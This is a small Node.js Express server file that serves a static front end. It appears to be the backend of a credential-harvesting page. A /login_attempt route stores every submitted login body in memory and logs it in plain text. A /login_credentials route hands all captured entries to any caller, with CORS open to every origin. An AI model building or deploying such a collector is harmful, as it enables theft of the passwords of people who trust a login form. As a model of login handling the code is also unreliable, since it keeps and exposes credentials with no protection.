const express = require('express');
var cors = require('cors');
const app = express();
const port = 4000;

//Middleware instatiation
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

//The static file that will be used on the server
app.use('/', express.static("build"));

//Just a console.log statement to let you know that the server is up and running and the port number.
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);

})

let userInfo = [];

app.post('/login_attempt', (req, res, next) => {
    userInfo.push(req.body);
    res.send(req.body);
    console.log(userInfo);
    next();
})

app.get('/login_credentials', (req, res, next) => {
    res.send(userInfo);
    next();
})